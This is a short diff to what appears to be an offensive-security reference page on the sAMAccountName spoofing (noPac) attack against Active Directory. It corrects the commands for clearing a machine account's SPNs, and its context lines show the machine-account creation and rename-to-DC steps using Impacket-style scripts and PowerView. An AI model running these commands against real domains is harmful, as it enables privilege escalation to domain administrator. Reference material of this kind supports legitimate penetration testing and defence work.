@@ -58,7 +58,7 @@ On UNIX-like systems, the steps mentioned above can be conducted with
 addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'
 
 # 1. clear its SPNs
-addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController
+addspn.py --clear -t 'ControlledComputer$' -u 'domain\user' -p 'password' 'DomainController.domain.local'
 
 # 2. rename the computer (computer -> DC)
 renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'
@@ -94,7 +94,7 @@ $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
 New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose
 
 # 1. clear its SPNs
-Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose
+Set-DomainObject -Identity 'ControlledComputer$' -Clear 'serviceprincipalname' -Verbose
 
 # 2. rename the computer (computer -> DC)
 Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose
